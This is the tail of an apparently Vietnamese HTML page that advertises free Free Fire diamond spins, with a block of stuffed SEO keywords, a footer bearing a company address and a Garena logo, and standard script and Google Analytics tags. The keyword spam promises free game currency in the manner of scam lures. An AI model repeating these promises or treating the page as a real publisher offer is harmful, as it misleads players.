phí,vongquay free fire miễn phí,vòng quay miễn phí ff,vòng quay free fire miễn phí 2022,vòng quay free fire miễn phí 2020,vòng quay kim cương free fire miễn phí 2022,vòng quay free fire miễn phí không cần đăng nhập,vòng quay kim cương free fire miễn phí 2020,vongquay free fire mien phi,vòng quay miễn phí,vòng quay kim cương miễn phí không cần tiền,shop quay kim cương miễn phí,vòng quay kim cương miễn phí,vòng quay kim cương miễn phí ff,vòng quay kc miễn phí,quay kc miễn phí,vòng quay thẻ garena miễn phí,shop quay miễn phí,
</p>








    </div>
  </div>

<footer id="footer">
<div class="container">
	<div class="row">
		<div class="col-md-6">
			Công ty TNHH Dịch Vụ Phần Mềm Thiên Bình<br/>
			Địa chỉ trụ sở chính: Tầng 29, tòa nhà Trung tâm Lotte Hà Nội, số 54, đường Liễu Giai, Phường Cống Vị, Quận Ba Đình, Thành phố Hà Nội, Việt Nam.
		</div>
		<div class="col-md-6">
		<img src="tom_image/foot.png" alt="garena" class="_2hGOTRIE9c">
		</div>
	</div>
</div>
</footer>



<script type='text/javascript' src='TOM_theme/imagesloaded.pkgd6ee86ee8.js?ver=20170605'></script>
<script type='text/javascript' src='TOM_theme/jquery.scrollTo6ee86ee8.js?ver=20170605'></script>
<script type='text/javascript' src='TOM_theme/jquery.scrollbar9c149c14.js?ver=25102017xza'></script>
<script type='text/javascript' src='TOM_theme/script00720072.js?ver=v6789'></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-CFPZ0ME8XT"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-CFPZ0ME8XT');
</script>

</body>
</html>